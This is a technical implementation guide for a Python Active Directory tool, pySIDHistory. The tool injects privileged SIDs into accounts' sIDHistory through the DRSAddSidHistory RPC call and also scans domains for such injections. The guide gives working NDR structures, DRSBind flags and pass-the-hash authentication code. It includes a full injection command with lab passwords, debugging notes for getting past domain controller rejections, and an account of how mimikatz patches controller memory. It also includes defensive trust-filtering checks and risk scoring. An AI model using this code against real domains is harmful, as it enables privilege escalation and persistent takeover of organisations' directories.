# pySIDHistory - Implementation Guide

Technical deep-dive into how pySIDHistory was designed and built.
Covers architecture decisions, protocol internals, and solutions to the hard problems.

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Why sIDHistory Can't Be Written via LDAP](#why-sidhistory-cant-be-written-via-ldap)
3. [Implementing DRSAddSidHistory (Opnum 20)](#implementing-drsaddsidhistory-opnum-20)
4. [NDR Structure Serialization](#ndr-structure-serialization)
5. [Authentication: The Pass-the-Hash Problem](#authentication-the-pass-the-hash-problem)
6. [LDAP Injection Prevention](#ldap-injection-prevention)
7. [SID Binary Format & Conversion](#sid-binary-format--conversion)
8. [Domain-Wide Scanning with Paged Results](#domain-wide-scanning-with-paged-results)
9. [Trust Enumeration & SID Filtering Detection](#trust-enumeration--sid-filtering-detection)
10. [Risk Assessment Engine](#risk-assessment-engine)

---

## Architecture Overview

```
sidhistory.py                    CLI entry point
    │
    ├── core/attack.py           Orchestrator (wires everything together)
    │       │
    │       ├── core/auth.py             Authentication (ldap3 + impacket)
    │       ├── core/ldap_operations.py  LDAP queries/modifications
    │       ├── core/drsuapi.py          DRSAddSidHistory RPC (opnum 20)
    │       ├── core/scanner.py          Domain-wide auditing
    │       └── core/output.py           JSON/CSV/Console formatting
    │
    └── core/sid_utils.py        SID conversion, presets, well-known SIDs
```

**Design principle**: Each module is self-contained. `attack.py` is the only file
that imports from multiple modules. This means you can use `LDAPOperations` or
`DRSUAPIClient` independently in your own scripts.

### Data Flow

```
User Input (CLI args)
    │
    ▼
Authentication (auth.py)
    │  ┌─ ldap3 Connection (NTLM, Kerberos, SIMPLE, Certificate)
    │  └─ impacket LDAPConnection (Pass-the-Hash fallback)
    │
    ▼
LDAP Operations (ldap_operations.py)
    │  ┌─ Read: get_object_sid(), get_sid_history(), find_all_with_sid_history()
    │  ├─ Write: add_sid_to_history(), remove_sid_from_history(), clear_sid_history()
    │  └─ Enum: enumerate_trusts(), get_domain_sid()
    │
    ▼                              ┌─────────────────────────┐
    │ ─── if --method drsuapi ───► │  DRSUAPI RPC (drsuapi.py)│
    │                              │  EPM → DRSBind → Op20    │
    │                              └─────────────────────────┘
    ▼
Output Formatting (output.py)
    │  ┌─ Console (colored, risk-tagged)
    │  ├─ JSON (structured, for SIEM)
    │  └─ CSV (for spreadsheets)
    ▼
stdout / file
```

---

## Why sIDHistory Can't Be Written via LDAP

This is the fundamental challenge that motivated the entire DRSUAPI implementation.

### The Schema Says It's Writable

Looking at the AD schema definition for `sIDHistory`:
- `systemOnly: FALSE` (not a system-only attribute)
- `searchFlags: 0` (no special search restrictions)
- Syntax: `2.5.5.17` (Octet String / SID)

So schema-wise, it looks like any attribute you could LDAP-modify with proper ACLs.

### The SAM Layer Blocks It

But Active Directory has **two layers of access control**:

1. **LDAP/DSA layer**: Checks the DACL on the object. If you have `WriteProperty`
   on `sIDHistory`, this layer says "OK".

2. **SAM layer**: A second check that intercepts modifications to SAM-owned attributes.
   The SAM layer enforces additional restrictions that **cannot be bypassed via ACLs**:
   - **Adding** SIDs to `sIDHistory` is blocked — the SAM requires the operation
     to go through `DsAddSidHistory` (the RPC call)
   - **Removing** SIDs from `sIDHistory` is allowed via LDAP

This is why:
```
MODIFY_ADD    on sIDHistory → "unwillingToPerform" (blocked by SAM)
MODIFY_DELETE on sIDHistory → Success (if you have WriteProperty)
MODIFY_REPLACE with [] on sIDHistory → Success (clearing is deletion)
```

### How mimikatz Bypasses This

mimikatz's `sid::patch` command patches two functions **in the DC's ntdsa.dll memory**:

1. **LoopbackCheck** — Validates that local LDAP modifications don't write
   system-protected attributes. Patched to unconditional jump (0xEB).

2. **SysModReservedAtt** — Specifically prevents writes to reserved attributes
   like `sIDHistory`. Same patch: conditional jump → unconditional jump.

After patching, `sid::add` performs a standard `ldap_modify_s()` with `LDAP_MOD_ADD`.
The SAM check is bypassed because the patched functions always return "allowed".

**Limitation**: This only works when running ON the DC with SYSTEM privileges.
It does NOT work on Server 2016+ due to changes in ntdsai.dll memory layout.

### Our Solution: DRSUAPI RPC

Instead of patching memory, we call `IDL_DRSAddSidHistory` (opnum 20) — the
**legitimate RPC call** that the Windows `DsAddSidHistory` API uses internally.
This is the same call that ADMT (Active Directory Migration Tool) uses.

---

## Implementing DRSAddSidHistory (Opnum 20)

### Why This Didn't Exist in Python Before

impacket implements DRSUAPI for DCSync (`DRSGetNCChanges`, opnum 3) and name
resolution (`DRSCrackNames`, opnum 12), but **not** `DRSAddSidHistory` (opnum 20).

No one had implemented it because:
1. The legitimate use case (domain migration) uses Windows-only tools (ADMT)
2. The attack use case (SID injection) was done via mimikatz (Windows-only)
3. The NDR structure has variable-length credential arrays that are tricky to serialize

### The Call Flow

```
Client                              Domain Controller
  │                                      │
  │ ── EPM (port 135) ──────────────────►│  Resolve DRSUAPI endpoint
  │ ◄── TCP port assignment ─────────────│
  │                                      │
  │ ── DCE/RPC BIND ───────────────────►│  Bind to DRSUAPI interface
  │    UUID: E3514235-4B06-11D1-AB04...  │  (with PKT_PRIVACY encryption)
  │ ◄── BIND_ACK ───────────────────────│
  │                                      │
  │ ── DRSBind (opnum 0) ──────────────►│  Establish DRS session
  │    dwFlags: DRS_EXT_ADD_SID_HISTORY  │  (signal we support op20)
  │ ◄── DRS_HANDLE + server extensions──│
  │                                      │
  │ ── DRSAddSidHistory (opnum 20) ────►│  The actual injection call
  │    DRS_MSG_ADDSIDREQ_V1 {           │
  │      Flags, SrcDomain, SrcPrincipal,│
  │      SrcDC, Credentials,            │
  │      DstDomain, DstPrincipal        │
  │    }                                 │
  │ ◄── DRS_MSG_ADDSIDREPLY_V1 ────────│  Win32 error code (0 = success)
  │                                      │
  │ ── DRSUnbind (opnum 1) ───────────►│  Close session
  │ ◄── OK ─────────────────────────────│
```

### The Three Variants

The server behavior depends on the `Flags` field:

**Variant 1: `DS_ADDSID_FLAG_PRIVATE_CHK_SECURE` (0x40000000)**
- Only verifies the RPC connection is encrypted (128-bit)
- Does NOT modify sIDHistory
- Used as a pre-flight check

**Variant 2: `DS_ADDSID_FLAG_PRIVATE_DEL_SRC_OBJ` (0x80000000)**
- Same-domain operation
- Copies objectSid + sIDHistory from source to destination's sIDHistory
- **DELETES the source object** after copying
- SrcPrincipal and DstPrincipal are DNs (not sAMAccountNames)
- Requires: `Migrate-SID-History` right + DELETE on source

**Variant 3: Flags = 0 (default, cross-forest)**
- Source and destination must be in **different forests**
- SrcPrincipal and DstPrincipal are sAMAccountNames
- Contacts the source DC to look up the source principal
- Performs SID uniqueness check across the destination forest
- Requires: Domain Admin in dest, Admin in source, auditing enabled

### Implementation in Python

Getting the NDR structures right was the hardest part of this project. Here's what
we learned the hard way, testing against a real GOAD lab.

```python
# core/drsuapi.py - The structures that actually work

# Credential fields are [size_is(n)] WCHAR * — conformant arrays, NOT strings.
class WCHAR_SIZED_ARRAY(NDRUniConformantArray):
    item = '<H'  # unsigned short = WCHAR

class PWCHAR_SIZED_ARRAY(NDRPOINTER):
    referent = (('Data', WCHAR_SIZED_ARRAY),)

class DRS_MSG_ADDSIDREQ_V1(NDRSTRUCT):
    structure = (
        ('Flags', DWORD),
        ('SrcDomain', LPWSTR),              # [string] WCHAR * — LPWSTR is correct
        ('SrcPrincipal', LPWSTR),            # [string] WCHAR *
        ('SrcDomainController', LPWSTR),     # [string, ptr] WCHAR *
        ('SrcCredsUserLength', DWORD),
        ('SrcCredsUser', PWCHAR_SIZED_ARRAY),     # [size_is()] WCHAR * — NOT LPWSTR!
        ('SrcCredsDomainLength', DWORD),
        ('SrcCredsDomain', PWCHAR_SIZED_ARRAY),
        ('SrcCredsPasswordLength', DWORD),
        ('SrcCredsPassword', PWCHAR_SIZED_ARRAY),
        ('DstDomain', LPWSTR),              # [string] WCHAR *
        ('DstPrincipal', LPWSTR),            # [string] WCHAR *
    )

# The union wrapper — required by NDR encoding
class DRS_MSG_ADDSIDREQ(NDRUNION):
    commonHdr = (('tag', DWORD),)
    union = { 1: ('V1', DRS_MSG_ADDSIDREQ_V1) }

class DRSAddSidHistory(NDRCALL):
    opnum = 20
    structure = (
        ('hDrs', drsuapi.DRS_HANDLE),
        ('dwInVersion', DWORD),
        ('pmsgIn', DRS_MSG_ADDSIDREQ),  # Union, not V1 directly
    )
```

### DRSBind: The Critical Flag

When binding, we **must** include `DRS_EXT_ADD_SID_HISTORY` (0x00040000) in
the capability flags, or the DC won't accept opnum 20 calls:

```python
drs['dwFlags'] = (
    drsuapi.DRS_EXT_GETCHGREQ_V6 |
    drsuapi.DRS_EXT_GETCHGREPLY_V6 |
    drsuapi.DRS_EXT_GETCHGREQ_V8 |
    drsuapi.DRS_EXT_STRONG_ENCRYPTION |
    0x00040000  # DRS_EXT_ADD_SID_HISTORY
)
```

This flag is not defined in impacket's `drsuapi.py` because they never
implemented opnum 20. We define it ourselves.

---

## NDR Structure Serialization — A Debugging Story

This section documents the real troubleshooting process of getting DRSAddSidHistory
to work. Every bug here was discovered against a live GOAD lab and cost real debugging
time. If you're implementing other DRSUAPI operations, these lessons will save you hours.

### Bug 1: `rpc_x_bad_stub_data` — The Missing Union

**Symptom**: Every DRSAddSidHistory call returned `rpc_x_bad_stub_data`. The RPC
connection worked (DRSBind succeeded), but the actual operation request was rejected
before the server even looked at the data.

**Root cause**: The `pmsgIn` field was defined as the V1 struct directly:

```python
# WRONG — causes rpc_x_bad_stub_data
class DRSAddSidHistory(NDRCALL):
    opnum = 20
    structure = (
        ('hDrs', drsuapi.DRS_HANDLE),
        ('dwInVersion', DWORD),
        ('pmsgIn', DRS_MSG_ADDSIDREQ_V1),  # <-- BUG: no union wrapper
    )
```

In NDR encoding, `[switch_is(dwInVersion)] DRS_MSG_ADDSIDREQ *pmsgIn` is a
**non-encapsulated union**. The discriminant tag IS serialized on the wire as part of
the union data. Without the NDRUNION wrapper, the tag byte is missing and every
subsequent field is offset by 4 bytes, making the entire request unreadable.

**The fix**: Wrap in NDRUNION, exactly like impacket does for DRSGetNCChanges:

```python
class DRS_MSG_ADDSIDREQ(NDRUNION):
    commonHdr = (('tag', DWORD),)
    union = { 1: ('V1', DRS_MSG_ADDSIDREQ_V1) }

class DRSAddSidHistory(NDRCALL):
    opnum = 20
    structure = (
        ('hDrs', drsuapi.DRS_HANDLE),
        ('dwInVersion', DWORD),
        ('pmsgIn', DRS_MSG_ADDSIDREQ),  # Union, not V1
    )
```

And when filling the request, set the tag explicitly:

```python
request['dwInVersion'] = 1
request['pmsgIn']['tag'] = 1       # Select V1 arm
v1 = request['pmsgIn']['V1']       # Access fields through the union
v1['SrcDomain'] = src_domain + '\x00'
```

**How we found it**: Compared with impacket's `DRSCrackNames` which uses the exact
same pattern (`dwInVersion` + NDRUNION). Every DRSUAPI call in impacket wraps its
message struct in an NDRUNION — this is not optional.

### Bug 2: `rpc_x_bad_stub_data` (again) — LPWSTR vs Conformant Array

**Symptom**: After the union fix, calls with NULL credentials worked (we got real
Win32 errors like 8536). But as soon as we passed actual source credentials
(`--src-username`, `--src-password`), `rpc_x_bad_stub_data` returned.

**Root cause**: The MS-DRSR IDL defines two different pointer types in the same struct:

```c
[string] WCHAR *SrcDomain;                          // null-terminated string
[size_is(SrcCredsUserLength)] WCHAR *SrcCredsUser;   // sized array
```

These look similar but have **completely different NDR wire encodings**:

```
LPWSTR ([string] WCHAR *):
  [Referent ID: 4 bytes]
  [MaximumCount: 4 bytes]
  [Offset: 4 bytes]        ← present!
  [ActualCount: 4 bytes]   ← present!
  [Data + null terminator]

Conformant array ([size_is(n)] WCHAR *):
  [Referent ID: 4 bytes]
  [MaximumCount: 4 bytes]
  [Data, NO offset/actualcount/null]  ← 8 bytes shorter!
```

When both are NULL pointers, they encode identically (just a zero referent ID).
That's why the NULL case worked. But with actual data, LPWSTR adds 8 extra bytes
(Offset + ActualCount) that the server doesn't expect for a sized array.

**The fix**: Define a proper conformant WCHAR array type:

```python
class WCHAR_SIZED_ARRAY(NDRUniConformantArray):
    item = '<H'  # unsigned short = WCHAR (2 bytes LE)

class PWCHAR_SIZED_ARRAY(NDRPOINTER):
    referent = (('Data', WCHAR_SIZED_ARRAY),)

class DRS_MSG_ADDSIDREQ_V1(NDRSTRUCT):
    structure = (
        ('SrcDomain', LPWSTR),                  # [string] — LPWSTR correct
        ('SrcCredsUser', PWCHAR_SIZED_ARRAY),    # [size_is()] — NOT LPWSTR
        ...
    )
```

And when setting credential values, pass a list of WCHAR ordinals:

```python
v1['SrcCredsUser'] = [ord(c) for c in username]  # list of unsigned shorts
```

### Bug 3: Error 8536 Misidentified as "SID Duplicated"

**Symptom**: After fixing both NDR issues, we got Win32 error 8536. Our error table
said "Target principal already has this SID" but LDAP queries showed the target had
no sIDHistory at all. The SID was never injected.

**Root cause**: Error 8536 is **not** `ERROR_DS_SID_DUPLICATED`. It's
`ERROR_DS_DESTINATION_AUDITING_NOT_ENABLED`. The error code translation table
was wrong.

DRSAddSidHistory requires "Audit account management" (Success + Failure) to be
enabled on BOTH the source and destination DCs. Without it, the operation is
rejected before any SID manipulation happens.

**The fix**: Correct the error table and add the related error:

```python
8521: "Source domain auditing not enabled (ERROR_DS_SOURCE_AUDITING_NOT_ENABLED)"
8536: "Destination domain auditing not enabled (ERROR_DS_DESTINATION_AUDITING_NOT_ENABLED)"
```

On the DCs: `auditpol /set /category:"Account Management" /success:enable /failure:enable`

### Bug 4: Error 8534 — Same Forest Rejection

**Symptom**: Trying to inject `administrator@sevenkingdoms.local` into
`jon.snow@north.sevenkingdoms.local` returned error 8534.

**Root cause**: `sevenkingdoms.local` and `north.sevenkingdoms.local` are in the
**same AD forest** (parent/child relationship). DRSAddSidHistory with `flags=0`
(cross-forest variant) requires source and destination to be in **different forests**.

In the GOAD lab:
- `sevenkingdoms.local` ↔ `north.sevenkingdoms.local` = same forest (WITHIN_FOREST trust)
- `essos.local` ↔ `sevenkingdoms.local` = different forests (FOREST_TRANSITIVE trust)

### Bug 5: Error 5 — ACCESS_DENIED Without Source Credentials

**Symptom**: Cross-forest call from `essos.local` to `north.sevenkingdoms.local`
returned `ERROR_ACCESS_DENIED` (5), even though the caller (`eddard.stark`) was
Domain Admin in the destination domain.

**Root cause**: DRSAddSidHistory cross-forest makes the **destination DC contact
the source DC** to verify the source principal. When `SrcCredsUser/Domain/Password`
are NULL, the DC uses the caller's credentials. But `eddard.stark` has no account
in `essos.local`, so the source DC rejects the authentication.

**The fix**: Add `--src-username`, `--src-password`, `--src-domain` CLI options to
pass credentials for the source domain. The destination DC uses these credentials
when contacting the source DC:

```bash
python3 sidhistory.py -d north.sevenkingdoms.local \
    -u eddard.stark -p 'FightP3aceAndHonor!' -dc 10.3.10.11 \
    --target jon.snow \
    --source-user daenerys.targaryen --source-domain essos.local \
    --method drsuapi \
    --src-username daenerys.targaryen --src-password 'BurnThemAll!' --src-domain essos.local
```

### Lesson Learned

You **cannot** unit-test NDR serialization without a real DC. The structures were
validated iteratively against a live GOAD lab:

1. `rpc_x_bad_stub_data` = your NDR encoding is wrong (union missing, wrong types)
2. Real Win32 errors (5, 8521, 8534, 8536, 8547, 8548) = encoding is correct,
   the DC is actually processing your request and rejecting it for business logic reasons
3. The transition from stub errors to application errors is how you know your
   serialization is finally right

---

## Authentication: The Pass-the-Hash Problem

### The Problem

ldap3 (our primary LDAP library) does NOT support NTLM Pass-the-Hash.
When you pass `LM:NT` as the password, ldap3 treats it as a literal password
string and computes a new NTLM hash of that string — which obviously doesn't
match the original hash.

### What We Tried

**Attempt 1: ldap3 with hash-as-password**
```python
connection = Connection(server, user=f"DOMAIN\\user",
                       password=f"{lm_hash}:{nt_hash}",
                       authentication=NTLM, auto_bind=True)
```
Result: Sometimes works with specific ldap3 versions that detect the `LM:NT` format.
Not reliable.

**Attempt 2: impacket's LDAP client**
```python
from impacket.ldap import ldap as imp_ldap
conn = imp_ldap.LDAPConnection(url, base_dn)
conn.login(username, '', domain, lm_hash, nt_hash)
```
Result: Authentication succeeds! But impacket's `LDAPConnection` has a different
API than ldap3's `Connection`. We'd need to rewrite all LDAP operations.

### The Solution

Two-stage approach:

1. **Try impacket PTH first** to validate the hash works, then create an ldap3
   connection (some DCs accept the hash-as-password format after impacket
   has established the NTLM session).

2. **If that fails**, fall back to pure ldap3 with the hash string.

3. **For DRSUAPI**: Pass credentials directly to `DRSUAPIClient.connect()`,
   which uses impacket's RPC transport with native hash support.

```python
def connect_ntlm_hash(self, username, nt_hash, use_ssl=False):
    # Parse hash format
    if ':' in nt_hash:
        lm_hash, nt_part = nt_hash.split(':', 1)
    else:
        lm_hash = 'aad3b435b51404eeaad3b435b51404ee'  # Empty LM
        nt_part = nt_hash

    # Store for DRSUAPI reuse
    self._lm_hash = lm_hash
    self._nt_hash = nt_part

    # Try impacket → ldap3 → fallback
    conn = self._pth_via_impacket(username, lm_hash, nt_part, use_ssl)
    if conn:
        return conn
    return self._pth_fallback_ldap3(username, lm_hash, nt_part, use_ssl)
```

---

## LDAP Injection Prevention

### The Vulnerability

The original code built LDAP search filters via string interpolation:

```python
# VULNERABLE
search_filter = f"(sAMAccountName={sam_account_name})"
```

If `sam_account_name` is `admin)(objectClass=*` the filter becomes:
```
(sAMAccountName=admin)(objectClass=*)
```
This returns ALL objects in the domain instead of just "admin".

### The Fix

ldap3 provides `escape_filter_chars()` which escapes LDAP special characters:

```python
from ldap3.utils.conv import escape_filter_chars

safe_name = escape_filter_chars(sam_account_name)
search_filter = f"(sAMAccountName={safe_name})"
```

Characters escaped: `*`, `(`, `)`, `\`, `\0` — all become `\XX` hex escapes.

Applied to every search in `ldap_operations.py` (3 functions: `get_object_sid`,
`get_object_dn`, `get_sid_history`).

---

## SID Binary Format & Conversion

### Structure

```
Offset  Size  Field
0       1     Revision (always 1)
1       1     SubAuthorityCount (number of sub-authorities)
2       6     IdentifierAuthority (big-endian, usually 5 = "NT Authority")
8       4*N   SubAuthorities (little-endian DWORDs)
```

Example: `S-1-5-21-1234567890-987654321-111222333-512`

```
01                          Revision = 1
05                          SubAuthorityCount = 5
00 00 00 00 00 05           IdentifierAuthority = 5 (NT Authority)
15 00 00 00                 SubAuth[0] = 21
D2 02 96 49                 SubAuth[1] = 1234567890
B1 68 DE 3A                 SubAuth[2] = 987654321
3D 50 A0 06                 SubAuth[3] = 111222333
00 02 00 00                 SubAuth[4] = 512
```

### Implementation

```python
@staticmethod
def bytes_to_string(sid_bytes: bytes) -> str:
    revision = sid_bytes[0]
    sub_authority_count = sid_bytes[1]
    identifier_authority = int.from_bytes(sid_bytes[2:8], byteorder='big')

    sid = f"S-{revision}-{identifier_authority}"

    for i in range(sub_authority_count):
        offset = 8 + (i * 4)
        sub_authority = struct.unpack('<I', sid_bytes[offset:offset + 4])[0]
        sid += f"-{sub_authority}"

    return sid
```

Key detail: IdentifierAuthority is **big-endian** (6 bytes) while SubAuthorities
are **little-endian** (4 bytes each). Getting this wrong produces valid-looking
but completely wrong SIDs.

---

## Domain-Wide Scanning with Paged Results

### The Problem

Active Directory limits LDAP search results to `MaxPageSize` (default 1000).
A domain with 5000 users would only return the first 1000 without paging.

### The Solution

LDAP Simple Paged Results Control (`1.2.840.113556.1.4.319`):

```python
def find_all_with_sid_history(self):
    results = []
    search_filter = "(&(sIDHistory=*)(|(objectCategory=person)(objectClass=group)(objectClass=computer)))"

    self.connection.search(
        search_base=self.base_dn,
        search_filter=search_filter,
        attributes=[...],
        paged_size=1000  # ldap3 handles the control
    )

    while True:
        for entry in self.connection.entries:
            results.append(self._parse_entry(entry))

        # Get the cookie for the next page
        cookie = self.connection.result.get('controls', {}).get(
            '1.2.840.113556.1.4.319', {}
        ).get('value', {}).get('cookie')

        if cookie:
            self.connection.search(..., paged_cookie=cookie)
        else:
            break  # No more pages

    return results
```

The search filter `(sIDHistory=*)` is efficient because it uses the attribute
presence index — the DC only returns objects that actually have `sIDHistory` set,
instead of scanning every object.

---

## Trust Enumeration & SID Filtering Detection

### How Trusts Are Stored

Domain trusts are stored as `trustedDomain` objects under `CN=System,<DomainDN>`:

```
CN=PARTNER.LOCAL,CN=System,DC=corp,DC=local
  objectClass: trustedDomain
  trustPartner: partner.local
  trustDirection: 3 (bidirectional)
  trustType: 2 (Active Directory)
  trustAttributes: 0x00000008 (FOREST_TRANSITIVE)
  flatName: PARTNER
  securityIdentifier: <binary SID of partner domain>
```

### SID Filtering Detection

The `trustAttributes` field is a bitmask:

```python
TRUST_ATTRIBUTE_NON_TRANSITIVE     = 0x00000001
TRUST_ATTRIBUTE_UPLEVEL_ONLY       = 0x00000002
TRUST_ATTRIBUTE_QUARANTINED_DOMAIN = 0x00000004  # SID filtering ON
TRUST_ATTRIBUTE_FOREST_TRANSITIVE  = 0x00000008
TRUST_ATTRIBUTE_CROSS_ORGANIZATION = 0x00000010
TRUST_ATTRIBUTE_WITHIN_FOREST      = 0x00000020
TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL  = 0x00000040  # SID history allowed
```

**SID Filtering is enabled** when `QUARANTINED_DOMAIN` (0x04) is set or
`TREAT_AS_EXTERNAL` (0x40) is NOT set on an external trust.

When SID filtering is active, the DC strips all SIDs with RID < 1000 from
authentication tokens at the trust boundary. This blocks Domain Admins (512),
Enterprise Admins (519), etc.

---

## Risk Assessment Engine

### Scoring Logic

The scanner assigns risk levels based on multiple factors:

```
CRITICAL:
  - Same-domain SID in sIDHistory (almost certainly an attack)
  - Enterprise Admins SID (519) or Schema Admins (518) from any domain
  - Domain Admins SID (512) in sIDHistory

HIGH:
  - BUILTIN SIDs (S-1-5-32-xxx) in sIDHistory
  - Other privileged RIDs (krbtgt-502, Domain Controllers-516)

MEDIUM:
  - Foreign domain SID with RID < 1000 (would be filtered at trust boundary)

LOW:
  - Foreign domain SID with RID >= 1000 (legitimate migration SID)

INFO:
  - sIDHistory present but no specific risk indicators
```

### Same-Domain Detection

The strongest attack indicator. Legitimate sIDHistory entries come from domain
migrations (domain A → domain B), so they should ALWAYS have a different domain SID.

If `sIDHistory` contains a SID from the **same domain** as the object, it was
almost certainly injected by an attacker:

```python
def is_same_domain_sid(sid_string: str, domain_sid: str) -> bool:
    sid_domain = extract_domain_sid(sid_string)  # Remove RID
    return sid_domain == domain_sid
```

This single check catches most SID History attacks with zero false positives
in non-migration environments.
